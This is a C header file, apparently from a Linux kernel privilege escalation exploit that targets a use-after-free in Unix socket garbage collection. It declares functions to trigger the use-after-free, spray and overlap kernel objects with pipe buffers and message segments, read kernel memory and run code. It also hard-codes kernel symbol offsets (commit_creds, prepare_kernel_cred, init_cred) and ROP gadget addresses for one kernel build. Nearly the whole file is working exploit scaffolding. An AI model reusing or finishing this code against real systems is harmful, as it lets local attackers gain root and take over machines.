#ifndef EXPLOIT_H
#define EXPLOIT_H

#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/un.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/syscall.h>

#include <linux/sockios.h>

typedef uint8_t u8;
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;

void unix_error(const char *msg);
void Pthread_error(const char *msg, int error_code);
int Socket(int domain, int type, int protocol);
void Socketpair(int domain, int type, int protocol, int socket_vector[2]);
void Setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
void Connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
void Bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
void Getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
void Listen(int sockfd, int backlog);
int Accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
ssize_t Sendmsg(int socket, const struct msghdr *message, int flags);
ssize_t Recvmsg(int socket, struct msghdr *message, int flags);
ssize_t Send(int sockfd, const void *buf, size_t size, int flags);
ssize_t Sendto(int sockfd, const void *msg, size_t length, int flags, const struct sockaddr *dst_addr, socklen_t dst_len);
ssize_t Recv(int sockfd, void *buf, size_t size, int flags);
void *Calloc(size_t nelem, size_t elsize);
void Close(int fd);
void Pipe(int pipefd[2]);
int Fcntl(int fd, int op, unsigned long arg);
ssize_t Write(int fd, const void *buf, size_t count);
ssize_t Read(int fd, void *buf, size_t count);
void Ioctl(int fd, unsigned long op, unsigned long arg);
void Unshare(int flags);
void Getrlimit(int resource, struct rlimit *rlim);
void Setrlimit(int resource, const struct rlimit *rlim);
int Msgget(key_t key, int msgflg);
void Msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg);
void Msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg);
int Msgctl(int msqid, int op, struct msqid_ds *buf);
void Sched_setaffinity(pid_t pid, size_t cpusetsize, const cpu_set_t *cpuset);
void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);
void Pthread_join(pthread_t thread, void **retval);
void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset);
void pin_thread_on_cpu(int cpu);
void sendfds(
        int unix_sockfd,
        void *data,
        size_t data_len,
        int *fds,
        int fds_len,
        struct sockaddr_un addr,
        socklen_t addrlen
);
void recvfds(int unix_sockfd, void *data, size_t data_len, int *fds, int fds_len, int msg_peek);

struct unix_gc_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool quit;
        bool trigger_gc;
        bool gc_complete;
        int trigger_gc_fd;
        int wait_for_gc_fd;
};

void *unix_gc_thread_fn(void *arg);
void unix_gc_thread_init(struct unix_gc_thread *t);
void unix_gc_thread_cleanup(struct unix_gc_thread *t);
void unix_gc_trigger(struct unix_gc_thread *t);
void unix_gc_wait(struct unix_gc_thread *t);
void unix_gc_thread_quit(struct unix_gc_thread *t);

#define SCM_MAX_FD	253

#define UAF_OOB_SKB_BYTE_DATA                   (u8)0x41
#define RECLAIM_UAF_OOB_SKB_DATA                (u8)0x42
#define DETECT_OVERLAP_PIPE_OOB_SKB_DATA        (u8)0x43

struct exploit_kernel_unix_graph {
        int stream_unix_socket_A_fd;
        int stream_unix_socket_B_fd;
        int stream_unix_socket_C_fd;
        int dgram_unix_socket_D_fd;
};

void exploit_kernel_unix_graph_prepare(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_build_stage_1(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_build_stage_2(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_cleanup(struct exploit_kernel_unix_graph *p);

struct cyclic_kernel_unix_graph {
        int dgram_unix_socket_fd;
};

void cyclic_kernel_unix_graph_prepare(struct cyclic_kernel_unix_graph *p);
void cyclic_kernel_unix_graph_build(struct cyclic_kernel_unix_graph *p);
void cyclic_kernel_unix_graph_cleanup(struct cyclic_kernel_unix_graph *p);

struct kernel_unix_vertex_spray {
        int vertex_count;
        int *dgram_unix_socket_fds;
};

void kernel_unix_vertex_spray_prepare(struct kernel_unix_vertex_spray *p, int spray_count);
void kernel_unix_vertex_spray_trigger_alloc(struct kernel_unix_vertex_spray *p);
void kernel_unix_vertex_spray_trigger_free(struct kernel_unix_vertex_spray *p);
void kernel_unix_vertex_spray_cleanup(struct kernel_unix_vertex_spray *p);

void prepare_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct cyclic_kernel_unix_graph *cyclic_kernel_unix_graph,
	struct kernel_unix_vertex_spray *kernel_unix_vertex_spray,
	struct unix_gc_thread *unix_gc_thread
);

bool trigger_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct unix_gc_thread *unix_gc_thread
);

bool uaf_success(int victim_socket_fd);

struct list_head {
	struct list_head *next, *prev;
};

static_assert(sizeof(struct list_head) == 16, "sizeof(struct list_head) != 16");

struct msg_msgseg {
        struct msg_msgseg *next;
};

static_assert(sizeof(struct msg_msgseg) == 8, "sizeof(struct msg_msgseg) != 8");

struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;
	struct msg_msgseg *next;
	void *security;
};

#define PAGE_SIZE               4096
#define DATALEN_MSG	        ((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG	        ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))
#define MSG_BUFFER_SIZE_MAX     (DATALEN_MSG + DATALEN_SEG + sizeof(long))

#define STRUCT_SK_BUFF_MEMBER_next_OFFSET               0x0
#define STRUCT_SK_BUFF_MEMBER_prev_OFFSET               0x8
#define STRUCT_SK_BUFF_MEMBER_LEN_OFFSET                0x70
#define STRUCT_SK_BUFF_MEMBER_DATA_OFFSET               0xd0
#define STRUCT_SK_BUFF_MEMBER_DATA_LEN_OFFSET           0x74
#define STRUCT_SK_BUFF_MEMBER__SKB_REFDST_OFFSET        0x58
#define STRUCT_SK_BUFF_MEMBER_destructor_OFFSET         0x60
#define STRUCT_SK_BUFF_MEMBER_users_OFFSET              0xdc

#define SKBUFF_HEAD_CACHE_OBJ_SIZE              256
#define SKBUFF_HEAD_CACHE_OBJS_PER_SLAB         16

static_assert(
        PAGE_SIZE / SKBUFF_HEAD_CACHE_OBJ_SIZE == SKBUFF_HEAD_CACHE_OBJS_PER_SLAB,
        "PAGE_SIZE / SKBUFF_HEAD_CACHE_OBJ_SIZE != SKBUFF_HEAD_CACHE_OBJS_PER_SLAB"
);

void setup_nofile_rlimit(void);
u64 find_kernel_base(void);

struct gate_struct {
        uint16_t offset_low;
        uint16_t segment;
        uint16_t bits;
        uint16_t offset_middle;
        uint32_t offset_high;
        uint32_t reserved;
};

static u64 asm_exc_divide_error_offset_from_kernel_base = 0x1400990;
static u64 init_task = 0x2a15a40;
static u64 init_cred = 0x2a75d80;
static u64 init_fs = 0x2bb33e0;
static u64 unix_unvisited_vertices_symbol = 0x2d03140;

static u64 push_rdx_pop_rsp_ret = 0x33a4da;
static u64 add_rsp_0x10_ret = 0x62b8ca;
static u64 pop_rdi_ret = 0x1406f0;
static u64 pop_rcx_ret = 0x11fe4b;
static u64 pop_rsi_ret = 0x9491de;
static u64 mov_rdi_rax_rep_ret = 0x12c35fb;
static u64 mov_qword_ptr_rax_rsi_ret = 0x1fe313;
static u64 add_rax_rcx_ret = 0xe4d84;

static u64 prepare_kernel_cred = 0x1d58d0;
static u64 commit_creds = 0x1d5630;
static u64 find_task_by_vpid = 0x1cbfa0;
static u64 swapgs_restore_regs_and_return_to_usermode_nopop = 0x14011c6;

static inline void update_kernel_address(u64 kernel_base)
{
        init_task += kernel_base;
        printf("[+] init_task: 0x%016lx\n", init_task);
        init_cred += kernel_base;
        printf("[+] init_cred: 0x%016lx\n", init_cred);
        init_fs += kernel_base;
        printf("[+] init_fs: 0x%016lx\n", init_fs);
        unix_unvisited_vertices_symbol += kernel_base;
        printf("[+] unix_unvisited_vertices_symbol: 0x%016lx\n", unix_unvisited_vertices_symbol);
        push_rdx_pop_rsp_ret += kernel_base;
        printf("[+] push_rdx_pop_rsp_ret: 0x%016lx\n", push_rdx_pop_rsp_ret);
        add_rsp_0x10_ret += kernel_base;
        printf("[+] add_rsp_0x10_ret: 0x%016lx\n", add_rsp_0x10_ret);
        pop_rdi_ret += kernel_base;
        printf("[+] pop_rdi_ret: 0x%016lx\n", pop_rdi_ret);
        pop_rcx_ret += kernel_base;
        printf("[+] pop_rcx_ret: 0x%016lx\n", pop_rcx_ret);
        pop_rsi_ret += kernel_base;
        printf("[+] pop_rsi_ret: 0x%016lx\n", pop_rsi_ret);
        mov_rdi_rax_rep_ret += kernel_base;
        printf("[+] mov_rdi_rax_rep_ret: 0x%016lx\n", mov_rdi_rax_rep_ret);
        mov_qword_ptr_rax_rsi_ret += kernel_base;
        printf("[+] mov_qword_ptr_rax_rsi_ret: 0x%016lx\n", mov_qword_ptr_rax_rsi_ret);
        add_rax_rcx_ret += kernel_base;
        printf("[+] add_rax_rcx_ret: 0x%016lx\n", add_rax_rcx_ret);

        prepare_kernel_cred += kernel_base;
        printf("[+] prepare_kernel_cred: 0x%016lx\n", prepare_kernel_cred);
        commit_creds += kernel_base;
        printf("[+] commit_creds: 0x%016lx\n", commit_creds);
        find_task_by_vpid += kernel_base;
        printf("[+] find_task_by_vpid: 0x%016lx\n", find_task_by_vpid);
        swapgs_restore_regs_and_return_to_usermode_nopop += kernel_base;
        printf("[+] swapgs_restore_regs_and_return_to_usermode_nopop: 0x%016lx\n", swapgs_restore_regs_and_return_to_usermode_nopop);
}

#define PAGE_PER_PIPE   256

void overlap_oob_skb_with_pipe_page(
        int *out_victim_fd,
        int out_overlap_pipe[2],
        int *out_page_nth,
        int *out_page_offset
);

static int g_victim_sockfd = -1;
static int g_overlap_pipe_fd[2];
static int g_overlap_page_nth = -1;
static int g_overlap_page_offset = -1;

static inline void uaf_oob_skb_overwrite_prepare(int sockfd, int pipe_fd[2], int page_nth, int page_offset)
{
        g_victim_sockfd = sockfd;
        g_overlap_pipe_fd[0] = pipe_fd[0];
        g_overlap_pipe_fd[1] = pipe_fd[1];
        g_overlap_page_nth = page_nth;
        g_overlap_page_offset = page_offset;
}

void uaf_oob_skb_overwrite_prepare_page_buffer(void *page_buffer, int member_offset, void *value, size_t value_size);
void uaf_oob_skb_overwrite_trigger(void *page_buffer);

void abr_read(u64 kernel_address, void *bytes, size_t total_bytes);

#define KMALLOC_CG_2K_SIZE      2048

#define STRUCT_unix_edge_SIZE   48

#define STRUCT_unix_vertex_MEMBER_entry_OFFSET          0x10
#define STRUCT_unix_vertex_MEMBER_edges_OFFSET          0x0
#define STRUCT_unix_vertex_MEMBER_out_degree_OFFSET     0x30

#define STRUCT_unix_edge_MEMBER_vertex_entry_OFFSET     0x10

bool setup_fake_skb_with_msg_msgseg(int victim_fd, int *out_qid, u64 *out_msg_msgseg_addr);
void overlap_msg_msgseg_with_pipe_buffer(int victim_fd, int qid, u64 fake_skb_addr, int out_pipe_fd[2]);
void trigger_code_execution(int qid, int pipe_fd[2], u64 msg_msgseg_addr);
void win(void);
void save_state(void);

struct pipe_buffer {
	void *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private_;
};

static inline void pipe_buffer_dump(struct pipe_buffer *pipe_buffer)
{
        printf("[+] page: 0x%016lx\n", (u64)(pipe_buffer->page));
        printf("[+] offset: %u\n", pipe_buffer->offset);
        printf("[+] len: %u\n", pipe_buffer->len);
        printf("[+] ops: 0x%016lx\n", (u64)(pipe_buffer->ops));
        printf("[+] flags: %u\n", pipe_buffer->flags);
        printf("[+] private: 0x%016lx\n", pipe_buffer->private_);
}

struct pipe_buf_operations {
	void *confirm;
	void *release;
	void *try_steal;
        void *get;
};

#define STRUCT_pipe_buf_operations_MEMBER_release_OFFSET        8

#define STRUCT_task_struct_MEMBER_fs_OFFSET    0x828 

static inline void wait_for_inspection(const char *msg)
{
        fprintf(stderr, "%s\n", msg);
        getchar();
}

#endif // EXPLOIT_H